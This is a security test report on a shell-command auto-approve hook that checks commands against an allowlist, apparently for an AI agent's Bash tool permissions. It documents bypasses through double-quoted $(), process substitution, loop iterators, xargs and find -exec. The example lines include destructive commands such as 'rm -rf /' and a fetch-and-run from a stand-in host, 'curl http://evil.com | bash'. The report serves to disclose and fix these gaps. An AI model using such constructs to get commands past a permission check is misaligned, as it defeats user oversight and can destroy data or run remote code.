# Hook Security Report

This report summarizes findings from comprehensive testing of the auto-approve hook system (`assets/auto-approve-allowed-commands.sh`). The hook parses shell commands using `shfmt` and validates them against a permission allowlist.

**Test Date:** December 2024
**Total Tests:** 445
**Passing:** 420
**Skipped (needs discussion):** 25

---

## Executive Summary

The hook correctly handles the vast majority of shell command patterns. However, testing revealed several **security gaps** where nested commands inside certain shell constructs are not extracted for permission checking. These gaps could allow dangerous commands to execute if a user has seemingly safe permissions.

**Risk Level:** Medium-High for users with broad permissions like `Bash(diff:*)` or `Bash(echo:*)`

---

## Security Findings

### 1. Command Substitution in Double Quotes (HIGH RISK)

**Issue:** Commands inside `$()` within double-quoted strings are NOT extracted for permission checking.

```bash
# With only Bash(echo:*) permission, this would be ALLOWED:
echo "Today is $(rm -rf /)"
```

**What happens:**
- The parser sees `echo "Today is $(..)"`
- Only `echo` is checked against permissions
- The nested `rm -rf /` is never validated

**Affected patterns:**
- `echo "$(dangerous_command)"`
- `echo "prefix $(cmd) suffix"`
- Any command with `$()` inside double quotes

**Current test status:** Skipped with `SECURITY` marker

**Recommendation:** Extract and validate commands from `$()` inside double quotes, OR document this as a known limitation and warn users.

---

### 2. Process Substitution Not Extracted (HIGH RISK)

**Issue:** Commands inside `<()` and `>()` process substitutions are completely ignored.

```bash
# With only Bash(diff:*) permission, this would be ALLOWED:
diff <(cat /etc/passwd) <(rm -rf /)

# With only Bash(cat:*) permission:
cat <(curl http://evil.com | bash)
```

**What happens:**
- The parser extracts only `diff` or `cat`
- Commands inside `<()` and `>()` are stripped entirely
- No permission check occurs for nested commands

**Current test status:** Documented in `edge_cases.bats` and `parsing_env_redirect.bats`

**Recommendation:** Either:
1. Extract commands from process substitutions for validation
2. Block ALL process substitutions by default (safest)
3. Document as known risk and require explicit `Bash(diff <(:*)` style permissions

---

### 3. For Loop Iterator Substitution (MEDIUM RISK)

**Issue:** Command substitution in for loop iterators is not extracted.

```bash
# With only Bash(echo:*) permission:
for f in $(find / -delete); do echo "$f"; done
```

**What happens:**
- Only `echo "$f"` is extracted from the loop body
- The `$(find / -delete)` in the iterator is ignored

**Current test status:** Skipped with `SECURITY` marker

**Recommendation:** Extract commands from loop iterators for validation.

---

### 4. Dangerous Wildcard Permissions (BY DESIGN - DOCUMENT)

**Issue:** Certain permissions are inherently dangerous because they allow arbitrary command execution.

```bash
# Bash(xargs:*) allows ANY command:
cat files.txt | xargs rm -rf /
cat files.txt | xargs bash -c "curl evil | sh"

# Bash(find:*) allows ANY command via -exec:
find . -exec rm -rf {} \;
find . -exec bash -c "dangerous" \;
```

**Current status:** Tests pass and document this behavior

**Recommendation:**
1. Add documentation warning about dangerous permissions
2. Consider a "dangerous permissions" list that triggers extra warnings
3. Potentially require more specific permissions like `Bash(xargs echo:*)` or `Bash(find . -name:*)`

---

## Behavioral Notes (Not Security Issues)

These are parser behaviors that differ from expectations but don't pose security risks:

### Commands Not Extracted

| Pattern | Behavior | Security Impact |
|---------|----------|-----------------|
| Function definitions | Not extracted | None (definitions don't execute) |
| Variable assignments (`export`, `declare`, `local`) | Not extracted | Low (assignments are generally safe) |
| `[[ ]]` test constructs | Not extracted | None (test conditions don't execute commands) |
| Arithmetic `$(( ))` | Stripped from output | None (arithmetic, not commands) |

### Parser Normalizations

| Input | Output | Notes |
|-------|--------|-------|
| `` `cmd` `` | `$(cmd)` | Backticks converted to `$()` |
| `${VAR}` | `$VAR` | Braces removed |
| `${arr[0]}` | `$arr` | Array index simplified |
| `${VAR:-default}` | `$VAR` | Default value stripped |

### Unwrapping Limitations

| Pattern | Unwrapped? | Notes |
|---------|------------|-------|
| `bash -c 'cmd'` | ✅ Yes | Correctly extracts inner command |
| `sh -c 'cmd'` | ✅ Yes | Correctly extracts inner command |
| `/bin/bash -c 'cmd'` | ❌ No | Absolute path not recognized |
| `env bash -c 'cmd'` | ❌ No | Prefix prevents unwrapping |

---

## Test Coverage Summary

### By Category

| Category | Tests | Status |
|----------|-------|--------|
| Pipes and pipelines | 15 | ✅ All pass |
| Chaining (&&, \|\|, ;) | 20 | ✅ All pass |
| Comments | 12 | ✅ All pass |
| Multi-line commands | 6 | ✅ All pass |
| Colons in commands | 12 | ✅ All pass |
| Quoted strings | 26 | ✅ All pass |
| String content safety | 26 | 3 skipped (security) |
| Subshells | 10 | ✅ All pass |
| Loops and conditionals | 21 | 3 skipped (behavioral) |
| bash -c unwrapping | 23 | 2 skipped (behavioral) |
| Environment variables | 15 | 4 skipped (behavioral) |
| Redirections | 15 | 6 skipped (security) |
| Builtins | 24 | ✅ All pass |
| Functions | 3 | 3 skipped (behavioral) |
| Paths | 21 | ✅ All pass |
| xargs/find | 34 | ✅ All pass |
| Permission matching | 29 | ✅ All pass |
| Real-world commands | 58 | ✅ All pass |
| Security (dangerous cmds) | 27 | ✅ All pass |
| Edge cases | 48 | 3 skipped (behavioral) |

### Security Tests Passing

The hook correctly blocks:
- Direct dangerous commands (`rm`, `mv`, `chmod`, `chown`, `sudo`)
- Dangerous commands in pipes (`ls | rm`)
- Dangerous commands in chains (`ls && rm file`)
- Remote code execution patterns (`curl | bash`, `wget | sh`)
- Command substitution with dangerous commands (`echo $(rm file)`)
- Backtick substitution with dangerous commands (`` echo `rm file` ``)
- bash -c with dangerous commands (`bash -c 'rm file'`)

---

## Recommendations

### Immediate (Before Production Use)

1. **Document the security gaps** in README or user-facing docs
2. **Add warnings** for dangerous permissions (`xargs:*`, `find:*`)
3. **Consider blocking process substitution** entirely as a safety measure

### Short-term Improvements

1. **Extract process substitution commands** for validation
2. **Handle double-quoted command substitution** properly
3. **Add absolute path detection** for `bash -c` (`/bin/bash`, `/usr/bin/bash`)

### Long-term Considerations

1. **Permission granularity** - Allow more specific permissions like:
   - `Bash(xargs ls:*)` instead of `Bash(xargs:*)`
   - `Bash(find . -name:*)` instead of `Bash(find:*)`
2. **Dangerous permission warnings** - Prompt users when adding risky permissions
3. **Audit logging** - Log all auto-approved commands for review

---

## Discussion Questions

1. **Process substitution:** Should we block it entirely, extract nested commands, or document as known risk?

2. **Double-quoted `$()`:** Is this a common enough pattern to warrant fixing, or is documentation sufficient?

3. **Dangerous permissions:** Should we maintain a list and show warnings, or trust users to understand the implications?

4. **Absolute paths:** Should `/bin/bash -c` be treated the same as `bash -c`?

5. **Permission granularity:** Is the current prefix-matching system sufficient, or do we need more sophisticated patterns?

---

## Files Reference

- **Hook script:** `assets/auto-approve-allowed-commands.sh`
- **Test helper:** `test/hook/hook_test_helper.bash`
- **Test files:** `test/hook/*.bats`
- **Test cases doc:** `HOOK_TEST_CASES.md`
